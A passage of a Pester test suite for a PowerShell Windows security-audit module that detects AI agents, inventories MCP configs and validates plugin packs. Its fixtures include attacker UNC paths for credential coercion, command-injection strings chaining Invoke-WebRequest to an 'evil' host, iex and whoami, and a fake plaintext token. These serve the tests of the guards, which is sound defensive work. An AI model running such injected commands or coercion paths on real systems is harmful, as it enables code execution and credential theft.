        New-Item -ItemType Directory -Force -Path (Join-Path $profileDir '.gemini'), (Join-Path $profileDir '.vscode\extensions\github.copilot-chat-0.30.0'), (Join-Path $profileDir '.vscode\extensions\github.copilot-1.350.0'),
            (Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions\copilot') | Out-Null
        # VS Code 1.13x: the app sits in a commit-hash folder (any name; it changes every release and the
        # module enumerates whatever is there) and ships Copilot Chat as a built-in whose folder is just
        # "copilot"; its package.json carries the real identity.
        Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions\copilot\package.json') -Value '{ "name": "copilot-chat", "publisher": "GitHub", "version": "0.66.0" }' -Encoding ASCII
        $builtInDir = Join-Path $profileDir 'AppData\Local\Programs\Microsoft VS Code\0123abcd00\resources\app\extensions'
        Mock -ModuleName CEAudit Get-CEVsCodeBuiltInExtensionDir { , @($builtInDir) }.GetNewClosure()
        InModuleScope CEAudit -Parameters @{ P = $profileDir } {
            param($P)
            $script:aiProfile = $P
            Mock Get-CEUserProfilePath { $script:aiProfile }
            Mock Get-CEInstalledSoftware {
                @([pscustomobject]@{ Name = 'Cursor (User)'; Version = '1.6'; Publisher = 'Anysphere'; KeyName = '{DADADADA}_is1' },
                  [pscustomobject]@{ Name = 'Cursor Themes Pack'; Version = '2'; Publisher = 'Somebody else'; KeyName = 'x' },
                  [pscustomobject]@{ Name = 'Ollama version 0.34.1'; Version = '0.34.1'; Publisher = 'Ollama'; KeyName = '{44E8}_is1' })
            }
            Mock Get-CEStorePackageName { @('Claude', 'Microsoft.Copilot', 'Microsoft.WindowsCalculator') }
            Mock Get-CEProcessList {
                @([pscustomobject]@{ Name = 'claude.exe'; ProcessId = 10; Path = 'C:\Program Files\WindowsApps\Claude_2.1_x64__pzs8sxrjxfjjc\app\claude.exe'; CommandLine = 'claude.exe'; Cim = $null },
                  [pscustomobject]@{ Name = 'claude.exe'; ProcessId = 20; Path = 'C:\Users\paul\.local\bin\claude.exe'; CommandLine = 'claude'; Cim = $null },
                  [pscustomobject]@{ Name = 'claude.exe'; ProcessId = 30; Path = ''; CommandLine = ''; Cim = $null },
                  [pscustomobject]@{ Name = 'node.exe'; ProcessId = 40; Path = 'C:\nodejs\node.exe'; CommandLine = 'node C:\npm\node_modules\@google\gemini-cli\bundle\gemini.js'; Cim = $null },
                  [pscustomobject]@{ Name = 'node.exe'; ProcessId = 50; Path = ''; CommandLine = ''; Cim = $null },
                  [pscustomobject]@{ Name = 'copilot.exe'; ProcessId = 60; Path = 'C:\Tools\SomethingElse\copilot.exe'; CommandLine = 'copilot'; Cim = $null })
            }
            Mock Get-CEProcessOwner { 'PC\paul' }
            Mock Get-CEProcessElevation { if ($ProcessId -eq 20) { 1 } else { 0 } }
            $st = Get-CEAIToolStateUncached -Context ([pscustomobject]@{ IsSystem = $false })
            $byId = @{}
            foreach ($t in $st.Tools) { $byId[$t.Id] = $t }
            @($byId.Keys | Sort-Object) | Should -Be @('claude-code', 'claude-desktop', 'cursor', 'gemini-cli', 'github-copilot-vscode', 'ollama')
            $byId['claude-desktop'].Processes.ProcessId | Should -Be 10
            $byId['claude-code'].Processes.ProcessId | Should -Be 20 -Because 'claude.exe is told apart by path'
            $byId['claude-code'].Processes[0].Elevated | Should -BeTrue
            $byId['cursor'].Signals | Should -Contain 'Installed program: Cursor (User) 1.6'
            $byId['ollama'].Signals | Should -Contain 'Installed program: Ollama version 0.34.1'
            @($byId['ollama'].Processes).Count | Should -Be 0
            $byId['github-copilot-vscode'].Signals | Should -Be @('VS Code extension: github.copilot-chat-0.30.0', 'VS Code built-in extension: github.copilot-chat', 'VS Code extension: github.copilot-1.350.0')
            $byId['gemini-cli'].Signals | Should -Contain 'Found %USERPROFILE%\.gemini'
            $st.UninspectedProcesses | Should -Be @('claude.exe (pid 30)') -Because 'node.exe and unrelated copilot.exe are not reported'
            Should -Invoke Get-CEProcessOwner -Times 0 -ParameterFilter { $Process.ProcessId -eq 60 }
        }
    }

    It 'SC-09 warns about agents that can act on the device, not local or chat-only tools' {
        Set-TestAITools -Tools @((New-TestAITool 'Claude desktop app'), (New-TestAITool 'Ollama' -Service '' -CanAct $false))
        $f = @(Invoke-CEAuditCore -Id 'SC-09')
        $warn = @($f | Where-Object { $_.Subject -eq 'Claude desktop app' })
        $warn.Status | Should -Be 'Warn'
        $warn.Actual | Should -Be 'AI agent that can act on this device: Claude desktop app'
        $warn.Recommendation | Should -Match 'MFA'
        @($f | Where-Object { $_.Subject -eq 'Ollama' }).Count | Should -Be 0
    }

    It 'UA-07 asks for MFA on the accounts AI tools use' {
        Set-TestAITools -Tools @((New-TestAITool 'Claude desktop app'), (New-TestAITool 'Cursor' -Service 'Cursor'), (New-TestAITool 'Ollama' -Service '' -CanAct $false))
        $f = @(Invoke-CEAuditCore -Id 'UA-07')
        ($f | Where-Object Subject -eq 'Anthropic (Claude)').Actual | Should -Match 'detected via: Claude desktop app'
        ($f | Where-Object Subject -eq 'Cursor').Status | Should -Be 'Manual'
        @($f | Where-Object Subject -eq '').Count | Should -Be 0
    }

    It 'UA-10: not applicable, pass, warn when elevated or SYSTEM, manual when it cannot tell' {
        Set-TestAITools -Tools @(New-TestAITool 'Ollama' -Service '' -CanAct $false)
        (@(Invoke-CEAuditCore -Id 'UA-10'))[0].Status | Should -Be 'NotApplicable'

        Set-TestAITools -Tools @(New-TestAITool 'Claude Code')
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Match 'none running at the time of the audit'

        Set-TestAITools -Tools @((New-TestAITool 'Claude Code' -Processes @((New-TestAgentProcess 20 -Elevated $true), (New-TestAgentProcess 21))),
                                 (New-TestAITool 'Cursor' -Service 'Cursor' -Processes @(New-TestAgentProcess 22 'Cursor.exe' $null 'NT AUTHORITY\SYSTEM')))
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f.Count | Should -Be 1
        $f[0].Status | Should -Be 'Warn'
        $f[0].Actual | Should -Be 'Running with administrator rights: Claude Code: claude.exe pid 20 as PC\paul; Cursor: Cursor.exe pid 22 as NT AUTHORITY\SYSTEM'

        Set-TestAITools -Tools @(New-TestAITool 'Claude Code' -Processes @(New-TestAgentProcess 20 -Elevated $null)) -Uninspected @('claude.exe (pid 30)')
        $f = @(Invoke-CEAuditCore -Id 'UA-10')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Be "Couldn't check: Claude Code: claude.exe pid 20 as PC\paul; Possible AI agent claude.exe (pid 30) (path not readable)"
    }
}

Describe 'Security review fixes' {
    Context 'VM inventory paths (credential coercion)' {
        It 'accepts only absolute local fixed-drive paths' {
            InModuleScope CEAudit {
                Test-CELocalFilePath 'C:\Users\paul\vm.vmx' | Should -BeTrue
                Test-CELocalFilePath '\\attacker\share\x.vmx' | Should -BeFalse
                Test-CELocalFilePath '//attacker/share/x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\\?\UNC\attacker\share\x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\\.\C:\x.vmx' | Should -BeFalse
                Test-CELocalFilePath 'C:x.vmx' | Should -BeFalse
                Test-CELocalFilePath '\x.vmx' | Should -BeFalse
                Test-CELocalFilePath 'x.vmx' | Should -BeFalse
                Test-CELocalFilePath '' | Should -BeFalse
            }
        }

        It 'never opens a UNC path named in a user VM inventory file' {
            InModuleScope CEAudit {
                $profileDir = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
                New-Item -ItemType Directory -Force -Path (Join-Path $profileDir 'AppData\Roaming\VMware') | Out-Null
                Set-Content -LiteralPath (Join-Path $profileDir 'AppData\Roaming\VMware\inventory.vmls') -Value 'vmlist1.config = "\\attacker-host\share\evil.vmx"'
                # The guard rejects the UNC path, so no VM is returned and the share is never opened
                # (an opened UNC path would coerce SYSTEM to authenticate). The guard itself is unit-tested above.
                # Assign first: the function returns ,@() and @()-wrapping the call inline nests it (see CONTRIBUTING.md).
                $vms = Get-CEVMwareMachine -ProfilePath $profileDir
                @($vms).Count | Should -Be 0
                Test-CELocalFilePath '\\attacker-host\share\evil.vmx' | Should -BeFalse
            }
        }
    }

    Context 'firmware catalog record validation' {
        It 'rejects records missing a version on any release, and SU-08 does not throw on odd records' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $good = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '1.0' }, [pscustomobject]@{ version = '1.1' }) }
                Test-CEFirmwareCatalogRecord $good 'dell' '0CF1' | Should -BeTrue
                $bad = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '1.0' }, [pscustomobject]@{ date = '2026-01-01' }) }
                Test-CEFirmwareCatalogRecord $bad 'dell' '0CF1' | Should -BeFalse -Because 'the second release has no version'

                # A record that slips through with a missing name / date must not throw.
                $hw = [pscustomobject]@{ Manufacturer = 'Dell'; Model = 'X'; Firmware = [pscustomobject]@{ Version = '1.0' } }
                $rec = [pscustomobject]@{ schemaVersion = 1; vendor = 'dell'; id = '0CF1'; checkedAt = (Get-Date).ToUniversalTime().ToString('o'); releases = @([pscustomobject]@{ version = '9.9'; criticality = 'Urgent' }) }
                Mock Get-CEFirmwareCatalogRecord { [pscustomobject]@{ Status = 'Found'; Record = $rec; FromCache = $false; Message = ''; Key = $null } }
                $ev = New-Object System.Collections.ArrayList
                [void]$ev.Add('hardware evidence')  # SU-08 always adds hardware lines before calling
                { Get-CEFirmwareCatalogResult -Context (New-TestContext) -Hardware $hw -Evidence $ev } | Should -Not -Throw
            }
        }
    }

    Context 'strict-mode config reads survive partial overrides' {
        It 'NC-08 is Manual, not Error, when secure-boot.json is missing sections' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $orig = (Get-CEConfig).'secure-boot'
                try {
                    (Get-CEConfig).'secure-boot' = [pscustomobject]@{ eventLookbackDays = 30 }  # no events, no certificates
                    $f = @(Invoke-CEAuditCore -Id 'NC-08')
                    @($f | Where-Object Status -eq 'Error').Count | Should -Be 0
                    ($f | Where-Object Subject -eq '').Status | Should -Be 'Manual'
                }
                finally { (Get-CEConfig).'secure-boot' = $orig }
            }
        }

        It 'SU-08 TPM advisories survive an advisory missing fields' {
            Set-TestDevice -Kind Secure
            InModuleScope CEAudit {
                $orig = (Get-CEConfig).'tpm-firmware-advisories'
                try {
                    (Get-CEConfig).'tpm-firmware-advisories' = [pscustomobject]@{ lastReviewed = '2026-01-01'; advisories = @([pscustomobject]@{ manufacturers = @('IFX'); affected = @([pscustomobject]@{ from = '1.0'; to = '9.0' }) }) }
                    { @(Invoke-CEAuditCore -Id 'SU-08') } | Should -Not -Throw
                }
                finally { (Get-CEConfig).'tpm-firmware-advisories' = $orig }
            }
        }
    }

    Context 'pack parent-directory ACL' {
        It 'rejects a ProgramData pack when only its parent folder is user-writable' {
            $data = Join-Path $TestDrive ([guid]::NewGuid().ToString('n'))
            New-Item -ItemType Directory -Force -Path (Join-Path $data 'packs\mypack') | Out-Null
            Set-Content -LiteralPath (Join-Path $data 'packs\mypack\pack.json') -Value '{ "id": "mypack", "name": "My pack", "version": "1.0.0" }'
            $env:CE_CHECKER_DATA = $data
            try {
                InModuleScope CEAudit -Parameters @{ Data = $data } {
                    param($Data)
                    $parent = Join-Path $Data 'packs'
                    # Only the parent folder is flagged as writable; the pack folder itself is clean.
                    Mock Get-CEPathAclProblem { if ($Path -eq $parent) { "$Path is writable by S-1-5-32-545" } else { @() } }
                    $pack = @(Get-CEPackCandidate | Where-Object { $_.Id -eq 'mypack' })
                    $pack.Count | Should -Be 1
                    $pack[0].Status | Should -Be 'Skipped'
                    $pack[0].Reason | Should -Match 'non-administrators could change it'
                    Should -Invoke Get-CEPathAclProblem -ParameterFilter { $Path -eq $parent } -Times 1 -Because 'the parent directory is checked'
                }
            }
            finally { Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue }
        }
    }

    Context 'data-path trust when elevated' {
        It 'trusts any path when not elevated or when CE_CHECKER_DATA is set' {
            InModuleScope CEAudit {
                Mock Test-CEIsAdmin { $false }
                Mock Get-CEPathAclProblem { @('writable by everyone') }
                Test-CEDataPathTrusted -Path 'C:\whatever' | Should -BeTrue -Because 'a non-elevated audit only affects its own user'
                Mock Test-CEIsAdmin { $true }
                $env:CE_CHECKER_DATA = 'C:\test-data'
                try { Test-CEDataPathTrusted -Path 'C:\whatever' | Should -BeTrue -Because 'the env override is a deliberate hook' }
                finally { Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue }
            }
        }

        It 'distrusts a writable default path when elevated' {
            InModuleScope CEAudit {
                Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
                Mock Test-CEIsAdmin { $true }
                Mock Get-CEPathAclProblem { @('C:\ProgramData\... is writable by S-1-5-32-545') }
                Test-CEDataPathTrusted -Path 'C:\ProgramData\EngramicBaseline\config' | Should -BeFalse
                Mock Get-CEPathAclProblem { @() }
                Test-CEDataPathTrusted -Path 'C:\ProgramData\EngramicBaseline\config' | Should -BeTrue
            }
        }
    }
}

Describe 'Feature packs' {
    # Last in the file: these tests re-import the module with packs installed, then restore it.
    BeforeAll {
        $script:modulePath = Join-Path (Join-Path (Join-Path $script:RepoRoot 'src') 'CEAudit') 'CEAudit.psd1'
        function global:New-TestPack {
            param([string]$Root, [string]$Folder, $Manifest, [hashtable]$Files = @{})
            $dir = Join-Path $Root $Folder
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
            if ($null -ne $Manifest) {
                $text = if ($Manifest -is [string]) { $Manifest } else { $Manifest | ConvertTo-Json -Depth 5 }
                Set-Content -LiteralPath (Join-Path $dir 'pack.json') -Value $text
            }
            foreach ($rel in $Files.Keys) {
                $target = Join-Path $dir $rel
                New-Item -ItemType Directory -Force -Path (Split-Path -Parent $target) | Out-Null
                Set-Content -LiteralPath $target -Value $Files[$rel]
            }
        }
        $rootA = Join-Path $TestDrive 'packs-a'
        $rootB = Join-Path $TestDrive 'packs-b'
        New-TestPack -Root $rootA -Folder 'good' -Manifest @{ id = 'good-pack'; name = 'Good pack'; version = '1.2.3'; minCoreVersion = '0.1.0'; categories = @(@{ id = 'GoodThings'; label = 'Good things' }) } -Files @{
            'Checks\01-Good.ps1' = @'
function Get-GoodPackAnswer { return (Get-CEConfig).'good-pack'.answer }
Register-CECheck -Id 'GP-01' -Category 'GoodThings' -Severity 'Low' -Title 'Good pack check' -Frameworks @('NCSC') -Reference 'Test.' -Test {
    param($ctx)
    New-CEResult -Status 'Pass' -Expected 'answer' -Actual "answer=$(Get-GoodPackAnswer)" -Remediation (New-CERemediationRef -Id 'GoodPack-Fix')
}
'@
            'Remediations\01-Good.ps1' = @'
Register-CERemediation -Id 'GoodPack-Fix' -Title 'Good pack fix' -Risk 'Low' -Apply { param($p, $undo) }
'@
            'config\good-pack.json' = '{ "answer": 42 }'
        }
        New-TestPack -Root $rootA -Folder 'no-manifest' -Manifest $null
        New-TestPack -Root $rootA -Folder 'bad-json' -Manifest '{ not json'
        New-TestPack -Root $rootA -Folder 'bad-id' -Manifest @{ id = 'Bad Id!'; name = 'x'; version = '1.0.0' }
        New-TestPack -Root $rootA -Folder 'too-new' -Manifest @{ id = 'too-new'; name = 'x'; version = '1.0.0'; minCoreVersion = '99.0.0' }
        New-TestPack -Root $rootA -Folder 'config-clash' -Manifest @{ id = 'config-clash'; name = 'x'; version = '1.0.0' } -Files @{ 'config\thresholds.json' = '{}' }
        New-TestPack -Root $rootA -Folder 'throws' -Manifest @{ id = 'throws'; name = 'x'; version = '1.0.0'; categories = @(@{ id = 'HalfDone'; label = 'Half done' }) } -Files @{
            'Checks\01.ps1' = @'
Register-CECheck -Id 'TH-01' -Category 'HalfDone' -Severity 'Low' -Title 't' -Frameworks @('NCSC') -Reference 't' -Test { }
throw 'boom'
'@
        }
        New-TestPack -Root $rootA -Folder 'duplicate-check' -Manifest @{ id = 'duplicate-check'; name = 'x'; version = '1.0.0' } -Files @{
            'Checks\01.ps1' = "Register-CECheck -Id 'FW-01' -Category 'Firewalls' -Severity 'Low' -Title 't' -Frameworks @('NCSC') -Reference 't' -Test { }"
        }
        New-TestPack -Root $rootA -Folder 'hijack' -Manifest @{ id = 'hijack'; name = 'x'; version = '1.0.0' } -Files @{
            'Checks\01.ps1' = "function Get-CEConfig { @{ hijacked = `$true } }"
        }
        New-TestPack -Root $rootB -Folder 'good-again' -Manifest @{ id = 'good-pack'; name = 'Good pack copy'; version = '9.9.9' }

        $script:savedPacksEnv = $env:CE_CHECKER_PACKS
        $env:CE_CHECKER_PACKS = $rootA + [IO.Path]::PathSeparator + $rootB
        # 3>&1: warnings raised while the module loads aren't caught by -WarningVariable.
        $script:packWarnings = @(Import-Module $script:modulePath -Force 3>&1)
        Set-TestTripwires
        $script:packs = @{}
        foreach ($p in @(Get-CEPack)) { $script:packs[(Split-Path -Leaf $p.Path)] = $p }
    }
    AfterAll {
        $env:CE_CHECKER_PACKS = $script:savedPacksEnv
        Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
        Import-Module $script:modulePath -Force
        Set-TestTripwires
    }

    It 'loads a valid pack: category, check, remediation, helper functions and config' {
        $good = $script:packs['good']
        $good.Status | Should -Be 'Loaded'
        $good.Version | Should -Be '1.2.3'
        $good.Checks | Should -Be @('GP-01')
        $good.Remediations | Should -Be @('GoodPack-Fix')
        (Get-CECategory | Where-Object Id -eq 'GoodThings').Label | Should -Be 'Good things'
        (Get-CECategory | Where-Object Id -eq 'GoodThings').Pack | Should -Be 'good-pack'
        (Get-CECheck -Id 'GP-01').Pack | Should -Be 'good-pack'
        (Get-CECheck -Id 'FW-01').Pack | Should -BeNullOrEmpty
        InModuleScope CEAudit { Mock Get-CEDeviceContext { New-TestContext } }
        $f = @(Invoke-CEAuditCore -Id 'GP-01')
        $f[0].Status | Should -Be 'Pass'
        $f[0].Actual | Should -Be 'answer=42' -Because "the pack's helper function and config are available when its check runs"
        $f[0].Pack | Should -Be 'good-pack'
        $f[0].Category | Should -Be 'GoodThings'
    }

    It 'skips invalid packs with a reason, without affecting the core' {
        $script:packs['no-manifest'].Reason | Should -Be 'No pack.json'
        $script:packs['bad-json'].Reason | Should -Match 'not valid JSON'
        $script:packs['bad-id'].Reason | Should -Match 'Invalid pack id'
        $script:packs['too-new'].Reason | Should -Match 'Needs Engramic Baseline 99\.0\.0 or later'
        $script:packs['config-clash'].Reason | Should -Match 'Config file name already used: thresholds\.json'
        $script:packs['good-again'].Reason | Should -Match "Pack 'good-pack' is already loaded"
        @(Get-CEPack | Where-Object Status -eq 'Loaded').Count | Should -Be 1
        @(Get-CECheck | Where-Object { -not $_.Pack }).Count | Should -Be 57
    }

    It 'rolls back everything a pack registered when it fails part way' {
        $script:packs['throws'].Status | Should -Be 'Skipped'
        $script:packs['throws'].Reason | Should -Match 'Failed to load: boom'
        @(Get-CECheck -Id 'TH-01').Count | Should -Be 0
        @(Get-CECategory).Id | Should -Not -Contain 'HalfDone'
        $script:packs['duplicate-check'].Reason | Should -Match 'Duplicate check id FW-01'
        @(Get-CECheck -Id 'FW-01').Count | Should -Be 1
        @($script:packWarnings | ForEach-Object { "$_" }) -join "`n" | Should -Match "pack 'throws' was not loaded"
    }

    It 'refuses a pack that replaces a built-in function, and puts the original back' {
        $script:packs['hijack'].Reason | Should -Match 'redefines the built-in function Get-CEConfig'
        (Get-CEConfig -Force).PSObject.Properties.Name | Should -Not -Contain 'hijacked'
        (Get-CEConfig).thresholds.patchWindowDays | Should -Be 14
    }

    It 'lets an administrator override pack config from the data folder' {
        $data = Join-Path $TestDrive 'data-override'
        New-Item -ItemType Directory -Force -Path (Join-Path $data 'config') | Out-Null
        Set-Content -LiteralPath (Join-Path (Join-Path $data 'config') 'good-pack.json') -Value '{ "answer": 7 }'
        $env:CE_CHECKER_DATA = $data
        try { (Get-CEConfig -Force).'good-pack'.answer | Should -Be 7 }
        finally { Remove-Item Env:\CE_CHECKER_DATA; Get-CEConfig -Force | Out-Null }
        (Get-CEConfig).'good-pack'.answer | Should -Be 42
    }

    It 'lists packs in status.json and the reports' {
        InModuleScope CEAudit { Mock Get-CEDeviceContext { New-TestContext } }
        $f = @(Invoke-CEAuditCore -Id 'GP-01')
        $ctx = New-TestContext
        $r = Export-CEReport -Findings $f -Context $ctx -OutputPath (Join-Path $TestDrive 'pack-report')
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match ([regex]::Escape('- **Packs:** Good pack 1.2.3'))
        (Get-Content $r.Paths.Html -Raw) | Should -Match 'Packs: Good pack 1\.2\.3'
        (Get-Content $r.Paths.Markdown -Raw) | Should -Match '### Good things'
        $status = ConvertTo-CEStatus -Findings $f -Summary $r.Summary -Context $ctx
        @($status.Packs | Where-Object { $_.Id -eq 'good-pack' -and $_.Status -eq 'Loaded' }).Count | Should -Be 1
        @($status.Packs | Where-Object { $_.Id -eq 'good-pack' -and $_.Status -eq 'Skipped' }).Count | Should -Be 1 -Because 'the duplicate copy is reported too'
        ($status.Packs | Where-Object { $_.Id -eq 'hijack' }).Status | Should -Be 'Skipped'
    }

    It 'checks pack permissions: only administrators, SYSTEM and TrustedInstaller may own or change them' {
        InModuleScope CEAudit {
            $rule = { param($sid, $rights, $type = 'Allow') [pscustomobject]@{ IdentityReference = $sid; FileSystemRights = [long]$rights; AccessControlType = $type } }
            $admins = 'S-1-5-32-544'; $users = 'S-1-5-32-545'; $user = 'S-1-5-21-1-2-3-1001'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @((& $rule 'S-1-5-18' 2032127), (& $rule $admins 2032127), (& $rule $users 1179817))).Count | Should -Be 0 -Because 'users may read and execute'
            @(Test-CEAdminOnlyAcl -Owner $user -Rules @()) | Should -Match 'owned by S-1-5-21-1-2-3-1001'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $users 1180063)) | Should -Match 'writable by S-1-5-32-545' -Because 'Modify includes write'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $user 0x10000000)) | Should -Match 'writable' -Because 'GENERIC_ALL on inherit-only entries'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule 'S-1-3-0' 2032127)).Count | Should -Be 0 -Because 'CREATOR OWNER only affects new items'
            @(Test-CEAdminOnlyAcl -Owner $admins -Rules @(& $rule $users 2032127 'Deny')).Count | Should -Be 0
        }
    }

    It 'refuses a pack in the data folder that a standard user could change' -Skip:(-not ($PSVersionTable.PSVersion.Major -lt 6 -or $IsWindows)) {
        $data = Join-Path $TestDrive 'data-packs'
        New-TestPack -Root (Join-Path $data 'packs') -Folder 'user-owned' -Manifest @{ id = 'user-owned'; name = 'x'; version = '1.0.0' }
        $env:CE_CHECKER_DATA = $data
        $env:CE_CHECKER_PACKS = $null
        try {
            Import-Module $script:modulePath -Force -WarningAction SilentlyContinue
            $p = Get-CEPack | Where-Object Id -eq 'user-owned'
            $p.Status | Should -Be 'Skipped'
            $p.Reason | Should -Match 'Not loaded because non-administrators could change it'
        }
        finally {
            Remove-Item Env:\CE_CHECKER_DATA -ErrorAction SilentlyContinue
            $env:CE_CHECKER_PACKS = $rootA + [IO.Path]::PathSeparator + $rootB
        }
    }
}

Describe 'Undo command safety (Test-CEUndoCommandAllowed)' {
    It 'allows the commands remediations actually generate' {
        InModuleScope CEAudit {
            $ok = @(
                "Set-NetFirewallProfile -Name 'Domain' -Enabled 'True'",
                "Enable-NetFirewallRule -Name 'RuleX'",
                "Enable-LocalUser -SID 'S-1-5-21-1-2-3-1001'",
                "net.exe user 'bob' /passwordreq:no",
                "Add-MpPreference -AttackSurfaceReductionRules_Ids 'abc' -AttackSurfaceReductionRules_Actions 'Enabled'",
                "Set-Service -Name 'W32Time' -StartupType 'Manual'",
                "wevtutil.exe sl Application /ms:20971520"
            )
            foreach ($c in $ok) { Test-CEUndoCommandAllowed $c | Should -BeNullOrEmpty -Because $c }
        }
    }

    It 'refuses anything outside the allow-list or with code-execution constructs' {
        InModuleScope CEAudit {
            $bad = @(
                "Invoke-Expression 'calc'",
                "Start-Process calc.exe",
                "Set-Service -Name 'x' -StartupType 'Manual'; Invoke-WebRequest 'http://evil/x'",
                "[System.IO.File]::WriteAllText('a.txt','pwned')",
                "& { whoami }",
                "Set-NetFirewallProfile -Name (iex 'evil')"
            )
            foreach ($c in $bad) { Test-CEUndoCommandAllowed $c | Should -Not -BeNullOrEmpty -Because $c }
        }
    }
}

Describe 'MCP inventory (11-McpInventory)' {
    Context 'JSONC parsing' {
        It 'parses strict JSON' {
            InModuleScope CEAudit { (ConvertFrom-CEJsonc -Text '{"a":1}').a | Should -Be 1 }
        }
        It 'tolerates line and block comments and trailing commas' {
            InModuleScope CEAudit {
                $t = "{`n // c`n `"servers`": { `"x`": { `"command`": `"npx`", }, /* b */ },`n}"
                (ConvertFrom-CEJsonc -Text $t).servers.x.command | Should -Be 'npx'
            }
        }
        It 'does not strip // or commas inside strings' {
            InModuleScope CEAudit {
                $r = ConvertFrom-CEJsonc -Text '{"url":"https://x/y","note":"a, b"}'
                $r.url | Should -Be 'https://x/y'
                $r.note | Should -Be 'a, b'
            }
        }
        It 'throws on genuinely malformed input' {
            InModuleScope CEAudit { { ConvertFrom-CEJsonc -Text '{ not json' } | Should -Throw }
        }
    }
    Context 'credential classification' {
        It 'classifies by prefix and marks plaintext' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                $c = Get-CECredentialClass -Key 'GITHUB_PERSONAL_ACCESS_TOKEN' -Value 'ghp_abcdEFGH1234567890' -Patterns $p
                $c.provider | Should -Be 'github'; $c.type | Should -Be 'pat-classic'; $c.storage | Should -Be 'plaintext-config'
            }
        }
        It 'treats a reference as env-var-reference, not plaintext' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                (Get-CECredentialClass -Key 'API_KEY' -Value '${env:MY_KEY}' -Patterns $p).storage | Should -Be 'env-var-reference'
            }
        }
        It 'returns null for a non-credential key/value' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                Get-CECredentialClass -Key 'command' -Value 'npx' -Patterns $p | Should -BeNullOrEmpty
            }
        }
        It 'returns unknown provider rather than guessing' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                (Get-CECredentialClass -Key 'SOME_TOKEN' -Value 'literalsecretvalue' -Patterns $p).provider | Should -Be 'unknown'
            }
        }
    }
    Context 'inventory end to end' {
        BeforeAll {
            $script:mcpTmp = Join-Path ([IO.Path]::GetTempPath()) ('eb-mcp-' + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $script:mcpTmp -Force | Out-Null
            $script:secret = 'ghp_SUPERsecretVALUE0123456789abcd'
            $fixture = '{ "mcpServers": { "github": { "command": "npx", "args": ["-y","@modelcontextprotocol/server-github"], "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "' + $script:secret + '" } }, "safe": { "command": "npx", "args": ["-y","@x/server"], "env": { "OPENAI_API_KEY": "${env:MY_KEY}" } } } }'
            $fixture | Set-Content -LiteralPath (Join-Path $script:mcpTmp '.claude.json') -Encoding ascii
        }
        AfterAll { Remove-Item -LiteralPath $script:mcpTmp -Recurse -Force -ErrorAction SilentlyContinue }
        It 'inventories servers and classifies credentials in the user session' {
            $inv = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })
            }
            $inv.mcpConfigsFound | Should -Be 1
            $inv.mcpConfigsParsed | Should -Be 1
            @($inv.mcpServers).Count | Should -Be 2
            $inv.credentialsFound | Should -Be 2
            $inv.credentialsPlaintext | Should -Be 1
        }
        It 'never lets a credential value reach the output' {
            $json = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                (Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T2'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })) | ConvertTo-Json -Depth 12
            }
            $json | Should -Not -Match ([regex]::Escape($script:secret))
        }
        It 'machine (SYSTEM) context records presence only, never reads contents' {
            $res = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                $i = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T3'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                [pscustomobject]@{ Found = $i.mcpConfigsFound; Parsed = $i.mcpConfigsParsed; Creds = $i.credentialsFound; Json = ($i | ConvertTo-Json -Depth 12) }
            }
            $res.Found | Should -Be 1
            $res.Parsed | Should -Be 0
            $res.Creds | Should -Be 0
            $res.Json | Should -Not -Match ([regex]::Escape($script:secret))
        }
    }
}

Describe 'SC-13 AI agent plaintext credentials' {
    function global:New-TestMcp {
        param([object[]]$Servers = @(), [int]$Plaintext = 0)
        [ordered]@{
            mcpConfigsFound = @($Servers).Count; mcpConfigsParsed = @($Servers).Count
            mcpConfigsUnreadable = @(); mcpServers = @($Servers)
            credentialsFound = @(@($Servers) | ForEach-Object { @($_.credentials) }).Count
